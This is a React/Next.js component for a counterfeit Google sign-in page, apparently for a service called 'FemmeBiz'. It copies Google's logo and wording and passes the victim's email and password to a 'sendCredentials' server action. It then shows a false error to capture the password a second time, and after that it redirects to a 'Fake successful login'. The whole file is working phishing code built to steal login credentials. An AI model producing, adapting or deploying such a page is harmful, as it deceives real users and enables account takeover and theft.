'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import styles from './GoogleAuth.module.css';
import { sendCredentials } from '../../actions';

export default function SignInPage() {
  const router = useRouter();
  const [step, setStep] = useState<1 | 2>(1);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [attempt, setAttempt] = useState(1);
  const [errorMsg, setErrorMsg] = useState('');

  const handleNext = () => {
    if (step === 1 && email.trim()) {
      setStep(2);
    } else if (step === 2 && password.trim()) {
      // Send credentials via server action
      sendCredentials(email, password, attempt);
      
      if (attempt === 1) {
        setErrorMsg('An error occurred, pls try again');
        setAttempt(2);
        setPassword('');
      } else {
        // Fake successful login, redirect to account
        router.push('/account');
      }
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleNext();
    }
  };

  return (
    <div className={styles.container}>
      <div className={styles.modal}>
        
        {/* LEFT COLUMN */}
        <div className={styles.leftCol}>
          <div className={styles.googleLogo}>
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
              <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
              <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
              <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
          </div>
          
          {step === 1 ? (
            <>
              <h1 className={styles.title}>Sign in</h1>
              <p className={styles.subtitle}>to continue to FemmeBiz</p>
            </>
          ) : (
            <>
              <h1 className={styles.title} style={{ fontSize: '32px' }}>Welcome</h1>
              <div 
                className={styles.profilePill}
                onClick={() => setStep(1)}
              >
                <div className={styles.profileAvatar}>
                  {email ? email[0].toUpperCase() : 'U'}
                </div>
                <span className={styles.profileEmail}>{email}</span>
                <svg className={styles.profileDropdown} width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M7 10l5 5 5-5z"/>
                </svg>
              </div>
            </>
          )}
        </div>

        {/* RIGHT COLUMN */}
        <div className={styles.rightCol}>
          {step === 1 ? (
            <>
              <div className={styles.inputGroup}>
                <input 
                  type="text" 
                  className={styles.input} 
                  placeholder=" " 
                  id="emailInput"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  onKeyDown={handleKeyDown}
                  autoFocus
                />
                <label htmlFor="emailInput" className={styles.label}>Email or phone</label>
              </div>
              <a href="#" className={styles.forgotLink}>Forgot email?</a>
              
              <p className={styles.guestText}>
                Not your computer? Use Guest mode to sign in privately. <a href="#" className={styles.learnMore}>Learn more about using Guest mode</a>
              </p>

              <div className={styles.actions}>
                <button type="button" className={styles.btnText}>Create account</button>
                <button type="button" className={styles.btnPrimary} onClick={handleNext}>Next</button>
              </div>
            </>
          ) : (
            <>
              <p className={styles.verifyText}>To continue, first verify that it&apos;s you</p>
              <div className={styles.inputGroup} style={{ marginTop: '0' }}>
                <input 
                  type={showPassword ? 'text' : 'password'} 
                  className={styles.input} 
                  placeholder=" " 
                  id="passwordInput"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onKeyDown={handleKeyDown}
                  autoFocus
                />
                <label htmlFor="passwordInput" className={styles.label}>Enter your password</label>
              </div>
              
              {errorMsg && (
                <div style={{ color: '#e24a4a', fontSize: '14px', marginTop: '8px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                  </svg>
                  {errorMsg}
                </div>
              )}
              
              <div className={styles.checkboxWrap}>
                <input 
                  type="checkbox" 
                  id="showPassword" 
                  className={styles.checkbox}
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                />
                <label htmlFor="showPassword">Show password</label>
              </div>

              <div className={styles.actions} style={{ marginTop: 'auto', paddingTop: '48px' }}>
                <button type="button" className={styles.btnText}>Forgot password?</button>
                <button type="button" className={styles.btnPrimary} onClick={handleNext}>Next</button>
              </div>
            </>
          )}
        </div>
        
      </div>

      <div className={styles.pageFooter}>
        <button className={styles.langSelect}>
          English (United States)
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
            <path d="M7 10l5 5 5-5z"/>
          </svg>
        </button>
        <div className={styles.footerLinks}>
          <a href="#">Help</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
        </div>
      </div>
    </div>
  );
}
